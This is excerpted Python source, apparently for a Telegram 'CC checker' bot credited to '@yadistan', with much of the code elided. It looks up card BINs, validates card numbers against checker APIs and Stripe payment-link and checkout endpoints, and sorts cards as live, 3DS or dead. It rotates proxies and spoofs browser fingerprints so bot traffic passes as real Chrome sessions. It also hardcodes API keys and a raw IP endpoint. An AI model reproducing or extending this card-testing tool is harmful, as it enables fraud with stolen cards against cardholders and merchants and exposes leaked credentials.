...
def _bin_lookup_all(bin6: str) -> dict:
    """
    Try 5 BIN APIs in order. Returns a unified dict:
      brand, card_type, level, bank, country, country_code
    All values are strings; unknown fields → 'Unknown'.
    """
    ...
    try:
        ...
        if r.status_code == 200:
            ...
            if isinstance(d, dict):
                ...
                level        = (d.get("prepaid") and "Prepaid") or ""
                ...
                if brand not in ("Unknown", ""):
                    return dict(brand=brand, card_type=card_type, level=level,
                                bank=bank, country=country, country_code=country_code)
    except Exception:
        pass

    # ── API 2: bins.antipublic.cc ─────────────────────────────────
    try:
        r2 = requests.get(
    ...
    # ── API 3: binsapi.vercel.app (deluxechecker source) ─────────
    try:
        r3 = requests.get(
        ...
        if r3.status_code == 200:
            ...
            if isinstance(d3, dict):
                brand        = (d3.get("scheme") or d3.get("brand") or "").upper() or "Unknown"
                card_type    = (d3.get("type") or "").capitalize()
                level        = ""
                country_obj  = d3.get("country") or {}
    ...
    # ── API 4: handyapi.com (free, no key) ───────────────────────
    try:
        r4 = requests.get(
        ...
        if r4.status_code == 200:
            d4 = r4.json()
            if isinstance(d4, dict) and d4.get("Status") == "SUCCESS":
                brand        = (d4.get("Scheme") or "").title() or "Unknown"
                card_type    = (d4.get("Type") or "").capitalize()
                level        = (d4.get("CardTier") or "").capitalize()
                country_obj  = d4.get("Country") or {}
                country      = country_obj.get("Name") or "Unknown" if isinstance(country_obj, dict) else "Unknown"
                country_code = country_obj.get("A2") or "N/A" if isinstance(country_obj, dict) else "N/A"
                bank_obj     = d4.get("Issuer") or {}
                bank         = bank_obj.get("Name") or "Unknown" if isinstance(bank_obj, dict) else "Unknown"
                if brand not in ("Unknown", ""):
                    return dict(brand=brand, card_type=card_type, level=level,
                                bank=bank, country=country, country_code=country_code)
    except Exception:
    ...
    return dict(brand="Unknown", card_type="", level="",
    ...
    def my_function():
        ...
        for i, px in enumerate(plist):
            ...
            try:
                ...
                r = req.get('https://api.ipify.org?format=json', proxies=pd, timeout=12)
...
def gc_command(message):
    def _gc_worker():
        ...
        # ── 3-tier CC checker: chkr.cc → RapidAPI → stripe_auth_ex ─────────
        _RAPID_KEY  = "251dd9dee9msh94228c4889d7899p12f7bdjsn60fff3f90e86"
        _RAPID_HOST = "bin-checker19.p.rapidapi.com"
        _RAPID_URL  = f"https://{_RAPID_HOST}/"

        def _normalize_resp(data):
            """
            Normalize any checker API response to chkr.cc code format:
              code 1 = Live/Approved
              code 2 = 3DS/OTP
              code 3 = Declined/Dead
              code -1 = Error/Timeout
            Handles both numeric code and text status fields.
            """
            ...
            # Already has numeric code (chkr.cc / bin-checker19 style)
            raw_code = data.get("code")
            if raw_code is not None:
                try:
                    c = int(raw_code)
                    # Sanity: re-classify code 3 if message says 3DS
            ...
            if any(k in status for k in ("approved", "live", "success", "charged")):
                if any(k in msg_l for k in ("3ds", "otp", "authenticate", "requires_action")):
                    return {"code": 2, "message": msg}
                return {"code": 1, "message": msg}
            if any(k in status for k in ("3ds", "otp", "authenticate", "redirect")):
                return {"code": 2, "message": msg}
            if any(k in status for k in ("declined", "dead", "failed", "invalid",
                                          "error", "rejected", "refus")):
                return {"code": 3, "message": msg}
            # Last resort: parse the message itself
            if any(k in msg_l for k in ("approved", "success", "charged")):
                return {"code": 1, "message": msg}
            if any(k in msg_l for k in ("3ds", "otp", "authenticate", "requires_action")):
                return {"code": 2, "message": msg}
            if any(k in msg_l for k in ("declined", "insufficient", "honor",
                                          "expired", "invalid", "refused")):
                return {"code": 3, "message": msg}
            return {"code": -1, "message": msg}
        ...
        def _is_rate_limited(data):
            ...
            err   = data.get("error")
            return (err is True or str(err).lower() in ("true","1")) and \
                   any(k in msg_l for k in ("quota", "rate", "limit", "too many"))

        def _chkrcc(card):
            """
            3-tier CC checker (fast):
              Tier 1 — api.chkr.cc          (6s timeout, 1 retry)
              Tier 2 — bin-checker19 RapidAPI (8s timeout, on rate-limit/fail)
              Tier 3 — stripe_auth_ex fallback
            """
            # ── Tier 1: chkr.cc ──────────────────────────────────────────
            ...
            try:
                ...
                if r2.status_code == 200:
                    data2 = r2.json()
                    if not _is_rate_limited(data2):
                        return _normalize_resp(data2)
            except Exception:
                pass
        ...
        # ── Concurrency: 3 workers for speed, bounded by total cards ────
...
def _build_help_msg2(name, is_vip, BL, current_amount, admin_section):
    ...
    return (
        ...
        "└──────────────────────────────\n"
        "⌤ <b>Dev by @yadistan</b> 🍀  ·  <i>Total: 40+ commands</i>"
    )
...
_OC_API = "http://108.165.12.183:8081/"
...
def _stripe_fingerprint_headers(origin: str = 'https://checkout.stripe.com') -> dict:
    """
    Build browser-like headers for Stripe API calls.
    Pixel extension: buildFingerprintGeoContext + generateFingerprintUserAgent
    These headers make bot requests look like real Chrome browser sessions.
    """
    ...
    if is_chrome:
        ...
        chrome_ver = _m.group(1) if _m else '120'
...
def _stripe_post(url, payload, headers=None):
    ...
    Uses full browser fingerprint headers (Pixel: buildFingerprintGeoContext).
    """
    hdrs = _stripe_fingerprint_headers()
    if headers:
        hdrs.update(headers)
    try:
...
def _co_ext_call(checkout_url, ccx):
    """
    Call external API for /co — routes buy.stripe.com to _stripe_paylink_check,
    otherwise falls back to pure-Python ext_stripe_check.
    Returns same dict format as ext_stripe_check.
    """
    # Route buy.stripe.com payment links to the stripe1$ method
    if "buy.stripe.com" in checkout_url:
        r = _stripe_paylink_check(checkout_url, ccx)
        st = r.get("status", "declined")
        msg = r.get("message", "")
        elapsed = r.get("elapsed", 0)
        # Normalize status to _ext_status compatible values
        if st == "3ds":
            norm_st = "3ds"
        elif st == "approved":
            norm_st = "approved"
            ...
            norm_st = "declined"
        return {"status": norm_st, "message": msg, "merchant": "Stripe Payment Link",
                "amount": "N/A", "time": f"{elapsed}s", "url": checkout_url}
    import time as _t
    t0 = _t.time()
    def _elapsed():
...
def _stripe_paylink_check(buy_url, card_str, proxy_dict=None):
    ...
    try:
        ...
        pl_r = sess.post(f"https://merchant-ui-api.stripe.com/payment-links/{pl_id}",
        ...
        # 3 — elements/sessions
        es_r = sess.get("https://api.stripe.com/v1/elements/sessions", headers=ah, params={
        ...
        # 4 — update line item
        if li_id:
            sess.post(f"https://api.stripe.com/v1/payment_pages/{cs_id}", headers=bh,
        ...
        pm_r = sess.post("https://api.stripe.com/v1/payment_methods", headers=bh,
        ...
        exp_s   = str(exp_amt)
        conf_r  = sess.post(f"https://api.stripe.com/v1/payment_pages/{cs_id}/confirm", headers=bh,
                            data=urllib.parse.urlencode({
...
_AH_KEY = os.environ.get("AH_KEY", "hitchk_4fefbe20e0b3dc3facc5d97dcdbec80fdafe53ae0803fe44")
...
def _ah_call(url, card, uid=None):
    ...
    try:
        ...
        if not raw:
            return {"status": "error", "message": f"API empty response (HTTP {r.status_code})", "elapsed": 0, "card_info": None}
        try:
            d = r.json()
        except Exception:
            return {"status": "error", "message": f"API bad response: {raw[:80]}", "elapsed": 0, "card_info": None}
        ...
        if "SSL" in err_msg or "certificate" in err_msg.lower():
            err_msg = "API SSL error — server unreachable"
        return {"status": "error", "message": err_msg[:100], "elapsed": 0, "card_info": None}
